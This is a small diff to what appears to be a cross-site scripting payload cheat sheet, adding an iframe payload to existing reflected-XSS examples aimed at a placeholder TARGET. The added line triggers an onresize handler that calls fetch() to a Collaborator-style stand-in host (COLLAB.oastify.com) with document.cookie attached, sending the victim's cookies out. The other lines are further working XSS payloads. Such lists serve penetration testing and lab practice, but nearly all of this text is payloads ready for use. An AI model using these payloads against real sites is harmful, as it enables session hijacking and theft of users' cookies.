@@ -62,6 +62,10 @@ location = 'https://TARGET/?search=<xss id=x onfocus=alert(1) tabindex=1>#x';
 <iframe src="https://TARGET/?search='<body onresize=print()>" onload=this.style.width='100px'></iframe>
 ```
 
+```html
+<iframe src="https://TARGET/?search=<body onresize=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie)>" onload=this.style.width='100px'></iframe>
+```
+
 ---
 
 ## Pattern: JavaScript Context Escape
